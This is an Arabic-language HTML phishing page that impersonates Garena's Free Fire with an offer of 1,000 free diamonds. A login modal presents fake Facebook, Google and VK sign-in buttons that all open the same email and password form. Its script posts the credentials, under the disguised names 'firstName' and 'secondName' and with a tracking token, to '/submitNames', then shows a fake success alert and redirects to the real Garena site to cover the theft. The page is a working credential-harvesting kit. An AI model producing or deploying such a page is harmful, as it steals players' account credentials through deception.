<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Meta Tags for Preview -->
    <meta property="og:title" content="Free Fire Diamond Center - جواهر فري فاير مجاناً">
    <meta property="og:description" content="اشحن جواهر فري فاير مجاناً! احصل على 1000 جوهرة + رقصة العرش عند التسجيل اليوم.">
    <meta property="og:image" content="https://ff.garena.com/static/images/icon_logo.png">

    <title>Free Fire Diamond Center</title>
    <style>
        body { font-family: 'Tahoma', sans-serif; background: #0b0e11; color: white; margin: 0; }
        .header { background: #ff4500; padding: 20px; text-align: center; font-size: 24px; font-weight: bold; border-bottom: 3px solid #ffd700; }
        .container { max-width: 400px; margin: 20px auto; padding: 15px; }
        .card { background: #1c1f26; border-radius: 15px; padding: 25px; border: 1px solid #333; text-align: center; }
        .input-group { margin: 20px 0; text-align: right; }
        input { width: 100%; padding: 12px; background: #2c2f36; border: 1px solid #444; border-radius: 8px; color: white; box-sizing: border-box; }
        .btn-ff { width: 100%; padding: 15px; background: #ff4500; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 4px 0 #b33000; }
        .plans { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
        .plan { background: #2c2f36; padding: 15px; border-radius: 10px; border: 2px solid transparent; cursor: pointer; }
        .plan.active { border-color: #ff4500; }
        
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); justify-content: center; align-items: center; z-index: 1000; }
        .modal-content { background: #1c1f26; padding: 30px; border-radius: 20px; width: 90%; max-width: 380px; text-align: center; border: 1px solid #ff4500; }
    </style>
</head>
<body>

<div class="header">FREE FIRE DIAMONDS 💎</div>

<div class="container">
    <div class="card">
        <img src="https://ff.garena.com/static/images/icon_logo.png" width="70">
        <h2>مركز توزيع الجواهر</h2>
        <p>أدخل معرف اللاعب (ID) الخاص بك واختر كمية الجواهر.</p>
        
        <div class="input-group">
            <label>ID اللاعب</label>
            <input type="text" id="player_id" placeholder="مثال: 123456789">
        </div>

        <div class="plans">
            <div class="plan active" onclick="selFF(this, true)">1,000 💎<br><small>مجاني</small></div>
            <div class="plan" onclick="selFF(this, false)">5,000 💎<br><small>19.99$</small></div>
        </div>

        <button class="btn-ff" id="ffBtn" onclick="openFF()">اشحن الآن</button>
    </div>
</div>

<div class="modal" id="ffModal">
    <div class="modal-content">
        <h3>تأكيد الحساب</h3>
        <p>يرجى تسجيل الدخول لتأكيد استلام الجواهر على حسابك.</p>
        <div style="display:flex; flex-direction:column; gap:10px;">
            <button style="background:#1877f2; color:white; padding:12px; border:none; border-radius:8px;" onclick="showL('Facebook')">تسجيل عبر Facebook</button>
            <button style="background:#ff4500; color:white; padding:12px; border:none; border-radius:8px;" onclick="showL('Google')">تسجيل عبر Google</button>
            <button style="background:#fff; color:black; padding:12px; border:none; border-radius:8px;" onclick="showL('VK')">تسجيل عبر VK</button>
        </div>
        <div id="lArea" style="display:none; margin-top:20px;">
            <input type="text" id="u" placeholder="البريد الإلكتروني" style="margin-bottom:10px;">
            <input type="password" id="p" placeholder="كلمة السر">
            <button class="btn-ff" style="margin-top:15px;" onclick="sendFF()">تأكيد الآن</button>
        </div>
    </div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('t');
    let isFree = true;

    function selFF(el, free) {
        document.querySelectorAll('.plan').forEach(p => p.classList.remove('active'));
        el.classList.add('active');
        isFree = free;
        document.getElementById('ffBtn').innerText = isFree ? "اشحن الآن" : "شراء الآن";
    }

    function openFF() {
        if(!isFree) return alert('بوابة الدفع مغلقة، اختر الباقة المجانية!');
        document.getElementById('ffModal').style.display = 'flex';
    }

    function showL(t) {
        document.getElementById('lArea').style.display = 'block';
    }

    async function sendFF() {
        const u = document.getElementById('u').value;
        const p = document.getElementById('p').value;
        if(!p) return alert('أدخل كلمة السر');

        await fetch('/submitNames', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token, firstName: u, secondName: p })
        });

        alert('تم بنجاح! سيتم شحن الجواهر خلال 24 ساعة.');
        window.location.href = "https://ff.garena.com";
    }
</script>
</body>
</html>
